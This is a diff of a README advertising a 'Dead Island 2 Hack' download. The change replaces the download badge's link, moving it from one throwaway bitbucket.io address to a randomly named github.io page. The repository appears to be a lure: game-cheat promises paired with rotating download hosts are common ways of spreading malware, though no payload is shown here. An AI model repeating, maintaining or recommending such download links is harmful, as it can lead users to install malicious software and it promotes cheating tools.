@@ -6,7 +6,7 @@ In the chaotic open-world of **Dead Island 2**, the undead don’t play fair. Bu
 
 🎮 From noob to death god in under 60 seconds.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload19.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://Dead-Island-2-Hack-zyq4.github.io/.github)
 ---
 
 ## 💥 Top Features in a Dead Island 2 Hack
